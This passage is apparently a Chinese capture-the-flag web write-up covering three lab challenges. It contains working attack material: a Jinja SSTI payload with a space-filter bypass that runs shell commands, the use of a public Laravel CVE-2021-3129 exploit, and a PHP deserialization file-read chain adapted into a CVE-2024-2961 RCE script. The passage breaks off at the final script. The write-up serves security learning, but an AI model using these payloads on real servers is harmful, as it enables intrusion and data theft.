class="string">&quot;&#123;&#123;7*7&#125;&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">response = requests.get(answer_url, headers=headers,data=data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br></pre></td></tr></table></figure><p>修改上面这部分代码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204503328-1700217939.png" alt="img"></p><p>成功执行，后面就ssti直接打了，注意在黑名单有个空格过滤，需要绕一下最终payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="comment"># 主页面 URL</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28/&quot;</span></span><br><span class="line">calc_url = url + <span class="string">&quot;calc&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起第一次请求，获取初始页面内容</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 h1 标签内容</span></span><br><span class="line">h1_text = soup.find(<span class="string">&#x27;h1&#x27;</span>).get_text().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一次请求内容:&quot;</span>, h1_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 h1 标签内容为 &quot;Are you ready for this?&quot;，等待一秒后检查新的内容</span></span><br><span class="line"><span class="keyword">if</span> h1_text == <span class="string">&quot;Are you ready for this?&quot;</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 等待 1 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次请求 /calc，模拟页面定时刷新后的情况</span></span><br><span class="line">    response = requests.get(calc_url, headers=headers)</span><br><span class="line">    h1_text = response.text.strip()  <span class="comment"># 获取返回内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查返回内容是否为算术表达式</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[\d\+\-\*/\s]+$&quot;</span>, h1_text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算术表达式为：&quot;</span>, h1_text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 使用 eval 计算结果</span></span><br><span class="line">            result = <span class="built_in">eval</span>(h1_text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算结果为：&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">            answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;&#123;&#123;[].__class__.__base__.__subclasses__()[351](&#x27;cat$&#123;IFS&#125;/flag&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">            response = requests.get(answer_url, headers=headers,data=data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 提取返回中的 flag&#123;&#125; 内容</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;flag\&#123;.*?\&#125;&#x27;</span>, response.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;获取到的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;未找到 flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算表达式时出错：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;返回内容不是算术表达式：&quot;</span>, h1_text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;页面内容未发生变化，h1 内容为：&quot;</span>, h1_text)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204533224-871070081.png" alt="img"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204538045-365324802.png" alt="img"></p><h2 id="ezlaravel">ezlaravel</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204558132-668296899.png" alt="img"></p><p>有版本号，google搜相关exp</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204607120-450017409.png" alt="img"></p><p>通过https://www.ambionics.io/blog/laravel-debug-rce</p><p>验证确定是CVE-2021-3129</p><p>图片上的链接试过出不来，接着找其他这个CVE的exp</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204642089-281007871.png" alt="img"></p><p>最终在github挨个试，找到这个项目https://github.com/joshuavanderpoll/CVE-2021-3129</p><p>要把项目中的phpggc-master目录下的文件都复制到与CVE-2021-3129.py同级目录，不然会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">3129.</span>py --force</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204705557-1565179572.png" alt="img"></p><p><code>laravel/rce12</code>这条链子可以RCE</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204725436-400606183.png" alt="img"></p><p>最后在根目录找到flag.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204740357-677709090.png" alt="img"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204746082-101934285.png" alt="img"></p><h2 id="fileread">fileread</h2><p>题目给了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cls</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;arr <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$filename</span> = <span class="string">&#x27;hello.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$txt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">           <span class="title function_ invoke__">var_dump</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&#x27;fileput&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileput</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$key</span>).<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your file:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">    <span class="variable">$cls</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">    <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cls</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个简单的反序列化,这样简单构造就能任意文件读取,但是读flag没有权限,后来看<code>/proc/1/cmdline</code>可以发现有个<code>/tmp/run.sh</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;cls=<span class="keyword">new</span> <span class="title function_ invoke__">cls2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;arr[]=<span class="string">&quot;fileput&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;cls-&gt;filename=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/proc/1/cmdline&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204837024-984031556.png" alt="img"></p><p>能够发现有个<code>/readflag</code>，最后肯定是要执行<code>/readflag</code>来获得flag，所以就是要任意文件读取转<code>rce</code>一开始试了<code>filterchain</code>写马,结果没成功,又试了<code>php_filter_oracle</code>攻击也没成功，不过这个可能是我打的有问题，最后尝试<code>CVE-2024-2961</code>，也是文件读取转RCE，但是得改脚本</p><p>之前的比赛也有考这个CVE的题，例如:<a href="%5Bhttp://fffffilm.top/2024/09/15/BaseCTF-WEB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Just-Readme%5D(http://fffffilm.top/2024/09/15/BaseCTF-WEB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Just-Readme)">BaseCTF的Just Readme</a>和<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185">春秋杯夏季赛wordpress</a></p><p>主要借鉴了春秋杯夏季赛wordpress最后攻击的点改的脚本.</p><p>最主要是改Remote这个类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tweak it to fit your target, and start the exploit.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.url = url</span><br><span class="line">        self.session = Session()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        p = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># 生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">        a = <span class="built_in">len</span>(p)</span><br><span class="line">        serialized_path = <span class="string">f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:<span class="subst">&#123;a&#125;</span>:&quot;<span class="subst">&#123;p&#125;</span>&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">        <span class="comment"># 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">        encoded_serialized_path = base64.encode(serialized_path.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        url =self.url</span><br><span class="line">        params=&#123;</span><br><span class="line">                <span class="string">&quot;ser&quot;</span>:encoded_serialized_path</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(params)</span><br><span class="line">        response = self.session.get(url, params=params)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"><span class="comment"># 打印实际请求的 UR</span></span><br><span class="line">       <span class="comment"># return self.session.get(url, params=params)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#     p = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">    <span class="comment">#生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">    <span class="comment">#     a = len(p)</span></span><br><span class="line">    <span class="comment">#     serialized_path = f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:&#123;a&#125;:&quot;&#123;p&#125;&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">    <span class="comment"># 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">    <span class="comment">#     encoded_serialized_path = base64.encode(serialized_path.encode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#     print(encoded_serialized_path)</span></span><br><span class="line">    <span class="comment"># 发送请求，获取响应</span></span><br><span class="line">        response = self.send(path)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="comment">#path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">        <span class="comment">#response = self.send(path)</span></span><br><span class="line">        data = re.search(<span class="string">r&#x27;Your file:(.*)&#x27;</span>, response.text, flags=re.S).group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#data=response.text</span></span><br><span class="line">        <span class="keyword">return</span> base64.decode(data)</span><br></pre></td></tr></table></figure><p>由于我们是要传递<code>http://url?ser=base64</code>加密后的payload，所以要更改原exp的请求部分，原exp是在path那部分传递payload，而我们需要在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;cls1&quot;</span>:<span class="number">2</span>:&#123;&#123;s:<span class="number">3</span>:<span class="string">&quot;cls&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;cls2&quot;</span>:<span class="number">2</span>:&#123;&#123;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:&#123;a&#125;:<span class="string">&quot;&#123;p&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;txt&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;arr&quot;</span>;a:<span class="number">1</span>:&#123;&#123;i:<span class="number">0</span>;s:<span class="number">7</span>:<span class="string">&quot;fileput&quot;</span>;&#125;&#125;&#125;&#125;;</span><br></pre></td></tr></table></figure><p>这里传递payload，于是在序列化字符串<code>filename</code>部分改成<code>s:&#123;a&#125;:&quot;&#123;p&#125;&quot;</code>，<code>&#123;a&#125;</code>是payload的长度，<code>&#123;p&#125;</code>是原payload</p><p>之后再用base64加密,并将原来的post传参改成get传参即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = self.session.get(url, params=params)</span><br></pre></td></tr></table></figure><p>然后就是另一个卡我半天的点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = re.search(<span class="string">r&#x27;Your file:(.*)&#x27;</span>, response.text, flags=re.S).group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>匹配语句这部分，要匹配的是响应的内容<code>file:</code>之后的部分</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205236168-702125291.png" alt="img"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205241457-510358314.png" alt="img"></p><p>在<code>def download</code>这个函数里写的传payload,最后执行exp的时候<code>send</code>函数里没写报的错,把这个一改就直接打通了</p><p>最终exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span 